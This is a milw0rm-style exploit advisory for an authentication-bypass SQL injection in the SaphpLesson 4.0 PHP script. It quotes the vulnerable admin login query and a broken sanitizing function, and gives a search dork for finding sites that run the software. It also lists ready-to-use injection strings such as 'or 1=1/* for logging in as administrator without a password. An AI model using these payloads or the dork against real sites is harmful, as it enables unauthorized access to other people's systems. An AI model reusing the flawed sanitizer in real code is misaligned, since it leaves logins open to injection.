@@ -1,0 +1,67 @@
+---------------------------------SaphpLesson v4.0 (Auth Bypass) SQL Injection Vulnerability---------------------------------------
+                       #                                                                            
+   #    ####     #    ###      ##   ###  ####  ####  ###   #####   ####  ####   ###     #    ### ####  ######
+   ##    #  #    ##    # #    # #  #  #   # #   #  #  #    #  #   #    #  # #  #  #     ##    #   # # #  #  #
+   # #   #  #    # #   # #    # #  #      #     #  #   #   #  #  #        #    #        # #   #   #      #   
+  #  #   ###    #  #   ###   #  #   ##    ###   ###    #  #   #  #        ###   ##      #  #  #   ###    #   
+  ####   #  #   ####   #  # ######    #   #     #  #    # #   #  #        #       #     #   # #   #      #   
+ #   #   #   # #   #   #  #     # #   #   #     #   #   ##    #   #    #  #   #   #     #    ##   #      #   
+##    #####   ##    ######     ### ###   ####  ###   #   #   ###   ####  ####  ###   # ###    #  ####   ###  
+
+
+#----------------------------------------------------------------------------------------------------------------
+Script : SaphpLesson
+version : 4.0
+Language: PHP
+Site: http://www.saphplesson.org
+Download: http://www.saphplesson.org/saphplesson.zip
+Dork: intext:Powered by SaphpLesson 4.0
+Found by: SwEET-DeViL
+
+need magic_quotes_gpc = Off
+
+#----------------------------------------------------------------------------------------------------------------
+
+)=> admin/login.php
+.................................................................................................................
+if ($_SERVER["REQUEST_METHOD"]=="POST"){
+          $username = CleanVar($_POST["cp_username"]); <======================================{
+          $password = md5(CleanVar($_POST["cp_password"]));
+          $IsLogin    = $db->get_var("select count(*) from modretor Where  ModName='".$username."' and ModPassword='".$password."'");
+
+.................................................................................................................
+
+function  of insecure !!
+
+)-)=> includes/functions.php
+---------------------------------------
+.[106] function CleanVar($var)
+.[107] {
+.[108]     (get_magic_quotes_gpc() === 0) ? $var : addslashes($var);
+.[109]
+.[110]     return htmlspecialchars(trim($var));
+.[111] }
+---------------------------------------
+
+#Exploit:
+
+username : 'or 1=1/*
+OR 
+username : 'or 1=1 or '
+OR 
+username : admin ' or ' 1=1--
+....
+
+password: SwEET-DeViL
+
+---------------------------------------
+
+
+/-------------www.arab4services.net-----------------\
+|+------------------------------------------------+ |
+||          SwEET-DeViL & viP HaCkEr              | |
+||            gamr-14(at)hotmail.com              | |
+|+------------------------------------------------+ |
+\---------------------------------------------------/
+
+# milw0rm.com [2009-07-24]
